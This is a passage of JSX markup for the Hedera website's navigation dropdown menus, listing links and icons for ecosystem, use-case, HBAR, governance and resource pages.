                                  src="https://files.hedera.com/Nav-Icon-Open-Source-hvr.svg?dm=1709012068"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Open Source</div>

                                <div className="menu-dropdown-item-description">
                                  Hedera is committed to open, transparent code.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/learning"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Tutorials-std.svg?dm=1709012115"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Tutorials-hvr.svg?dm=1709012114"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Learning Center</div>

                                <div className="menu-dropdown-item-description">
                                  Learn about web3 and blockchain technologies.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/grants-accelerators"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Grant-Funding-std.svg?dm=1709012009"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Grant-Funding-hvr.svg?dm=1709012007"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Grants</div>

                                <div className="menu-dropdown-item-description">
                                  Grants &amp; accelerators for your project.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/bounty"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Bug-Bounty-std.svg?dm=1709011918"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Bug-Bounty-hvr.svg?dm=1709011916"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Bounties</div>

                                <div className="menu-dropdown-item-description">
                                  Find bugs. Submit a report. Earn rewards.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>

            <li>
              <div
                className="menu-btn menu-title menu-title-3 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-ecosystem"
                >Ecosystem</button>

                <div
                  className="menu-dropdown  menu-dropdown-3 has-section-title"
                  
                  style={{marginLeft: 0}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-ecosystem"
                    // ariaLabelledby="menu-button-ecosystem"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-two-columns">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-ecosystem"
                        >ECOSYSTEM</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Ecosystem.svg?dm=1709246679"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Ecosystem-Hvr.svg?dm=1709246715"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Hedera Ecosystem</div>

                                <div className="menu-dropdown-item-description">
                                  Applications, developer tools, network explorers, and more.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-two-columns">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-categories"
                        >CATEGORIES</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/web3-applications"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Web3-Hvr.svg?dm=1709012116"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Web3-Hvr.svg?dm=1709012116"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Web3 Applications</div>

                                <div className="menu-dropdown-item-description">
                                  Connect into the innovative startups decentralizing the web on Hedera.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/enterprise-applications"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Enterprise.svg?dm=1709011969"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Enterprise-Hvr.svg?dm=1709011968"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Enterprise Applications</div>

                                <div className="menu-dropdown-item-description">
                                  Learn about the Fortune 500 companies decentralizing the web on Hedera.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/wallets-custody"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Wallets-std.svg?dm=1710695148"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Wallets-hvr.svg?dm=1710695208"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Wallets &amp; Custodians</div>

                                <div className="menu-dropdown-item-description">
                                  Create a Hedera account to manage HBAR, fungible tokens, and NFTs.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/network-explorers"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Network-Explorers.svg?dm=1709012058"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Network-Explorers-Hvr.svg?dm=1709012058"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Network Explorers</div>

                                <div className="menu-dropdown-item-description">
                                  Hedera mainnet and testnet graphical network explorers.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/developer-tooling-integrations"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Tooling.svg?dm=1709012110"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Tooling-Hvr.svg?dm=1709012109"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Developer Tooling</div>

                                <div className="menu-dropdown-item-description">
                                  Third-party APIs, integrations, and plugins to build apps on Hedera.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/grants-accelerators"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Grants.svg?dm=1709012010"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Grants-Hvr.svg?dm=1709012010"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Grants &amp; Accelerators</div>

                                <div className="menu-dropdown-item-description">
                                  Boost your project with support from the Hedera ecosystem.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/explore-partners"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Partner.svg?dm=1709012072"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Partner-Hvr.svg?dm=1709012070"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Partner Program</div>

                                <div className="menu-dropdown-item-description">
                                  Explore our partners to bring your vision into reality.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/governing-council"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Council.svg?dm=1709011933"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Council-Hvr.svg?dm=1709011924"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Hedera Council</div>

                                <div className="menu-dropdown-item-description">
                                  Over 30 highly diversified organizations govern Hedera.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>

            <li>
              <div
                className="menu-btn menu-title menu-title-4 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-use-cases"
                >Use Cases</button>

                <div
                  className="menu-dropdown  menu-dropdown-4 has-section-title"
                  
                  style={{marginLeft: 0}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-use-cases"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-hedera-solutions"
                        >Hedera Solutions</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/stablecoin-studio"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Stablecoin-Studio-Blue-hvr.svg?dm=1709012095"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Stablecoin-Studio-Pink-hvr.svg?dm=1709012097"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Stablecoin Studio</div>

                                <div className="menu-dropdown-item-description">
                                  All-in-one toolkit for stablecoin solutions.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/guardian"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Guardian-Blue-hvr.svg?dm=1709012012"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Guardian-Pink-hvr.svg?dm=1709012013"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Hedera Guardian</div>

                                <div className="menu-dropdown-item-description">
                                  Auditable carbon markets and traceability.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-two-columns">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-functional-use-cases"
                        >Functional Use Cases</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/data-integrity"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Data-Integrity.svg?dm=1716930149"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Data-Integrity-Hvr.svg?dm=1716930216"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Data Integrity &amp; AI</div>

                                <div className="menu-dropdown-item-description">
                                  Reliable, secure, and ethically governed insights.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/sustainability"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Sustainability-std.svg?dm=1709012102"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Sustainability-hvr.svg?dm=1709012102"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Sustainability</div>

                                <div className="menu-dropdown-item-description">
                                  Enabling fair carbon markets with trust.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/real-world-asset-tokenization"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-RWA-Tokenization-std.svg?dm=1710256143"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-RWA-Tokenization-hvr.svg?dm=1710256144"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Real-World Asset Tokenization</div>

                                <div className="menu-dropdown-item-description">
                                  Seamless tokenization of real-world assets and digital at scale.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/consumer-engagement-loyalty"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Customer-Loyalty-std.svg?dm=1710256136"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Customer-Loyalty-hvr.svg?dm=1710256139"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">
                                  Consumer Engagement &amp; Loyalty
                                </div>

                                <div className="menu-dropdown-item-description">
                                  Mint, distribute, and redeem loyalty rewards.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/decentralized-identity"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Decentralized-ID-std.svg?dm=1709011950"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Decentralized-ID-hvr.svg?dm=1709011949"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Decentralized Identity</div>

                                <div className="menu-dropdown-item-description">
                                  Maintain the lifecycle of credentials.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/decentralized-logs"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Decentralized-Logs-std.svg?dm=1709011959"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Decentralized-Logs-hvr.svg?dm=1709011953"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Decentralized Logs</div>

                                <div className="menu-dropdown-item-description">
                                  Scalable, real-time timestamped events.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/defi"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-DeFi-std.svg?dm=1709011948"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-DeFi-hvr.svg?dm=1709011940"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">DeFi</div>

                                <div className="menu-dropdown-item-description">
                                  Dapps built for the next-generation of finance.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/nfts"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-NFTs-std.svg?dm=1709012057"
                                  loading="eager"
                                  
                               />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-NFTs-hvr.svg?dm=1709012056"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">NFTs</div>

                                <div className="menu-dropdown-item-description">
                                  Low, fixed fees. Immutable royalties.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/use-cases/payments"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Payments-std.svg?dm=1709012074"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Payments-hvr.svg?dm=1709012074"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Payments</div>

                                <div className="menu-dropdown-item-description">
                                  Scalable, real-time, and affordable crypto-payments.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>

            <li>
              <div
                className="menu-btn menu-title menu-title-5 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-hbar"
                >HBAR</button>

                <div
                  className="menu-dropdown  menu-dropdown-5 sans-section-title"
                  
                  style={{marginLeft: 0}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-hbar"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/hbar"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-HBAR-Overview-std.svg?dm=1709012016"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-HBAR-Overview-hvr.svg?dm=1709012015"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Overview</div>

                                <div className="menu-dropdown-item-description">
                                  Learn about Hedera's token, HBAR.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/treasury-management-report"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Treasury-Mgmt-std.svg?dm=1709012113"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Treasury-Mgmt-hvr.svg?dm=1709012112"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Treasury Management</div>

                                <div className="menu-dropdown-item-description">
                                  Hedera’s report of the HBAR supply.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>

            <li>
              <div
                className="menu-btn menu-title menu-title-6 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-governance"
                >Governance</button>

                <div
                  className="menu-dropdown  menu-dropdown-6 has-section-title"
                  // 
                  style={{ marginLeft: 0}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-governance"
                    // ariaLabelledby="menu-button-governance"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-decentralized-governance"
                        >Decentralized Governance</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/council"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Gov-Council-std.svg?dm=1709012005"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Gov-Council-hvr.svg?dm=1709011998"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Hedera Council</div>

                                <div className="menu-dropdown-item-description">
                                  See the world's leading organizations that own Hedera.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/about"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-About-std.svg?dm=1709011909"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-About-hvr.svg?dm=1709011906"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">About</div>

                                <div className="menu-dropdown-item-description">
                                  Meet Hedera's Board of Directors and team.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/journey"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Journey-std.svg?dm=1709012052"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Journey-hvr.svg?dm=1709012050"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Journey</div>

                                <div className="menu-dropdown-item-description">
                                  Watch Hedera's journey to build an empowered digital future for all.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-transparent-governance"
                        >Transparent Governance</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/public-policy"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Public-Policy-std.svg?dm=1709012077"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Public-Policy-hvr.svg?dm=1709012077"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Public Policy</div>

                                <div className="menu-dropdown-item-description">
                                  Hedera's mission is to inform policy and regulation that impact the industry.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/council/minutes"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Meeting-Minutes-std.svg?dm=1709012054"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Meeting-Minutes-hvr.svg?dm=1709012054"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Meeting Minutes</div>

                                <div className="menu-dropdown-item-description">Immutably recorded on Hedera.</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/roadmap"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Roadmap-std.svg?dm=1709012085"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Roadmap-hvr.svg?dm=1709012082"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Roadmap</div>

                                <div className="menu-dropdown-item-description">
                                  Follow Hedera's roadmap in its journey to build the future.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>

            <li>
              <div
                className="menu-btn menu-title menu-title-7 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-resources"
                >Resources</button>

                <div
                  className="menu-dropdown  menu-dropdown-7 has-section-title"
                  
                  style={{marginLeft: 12.3344}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-resources"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-company"
                        >Company</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/whats-new"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">What's New</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/partners"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Partners</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item menu-dropdown-item--no-icon">
                            <a
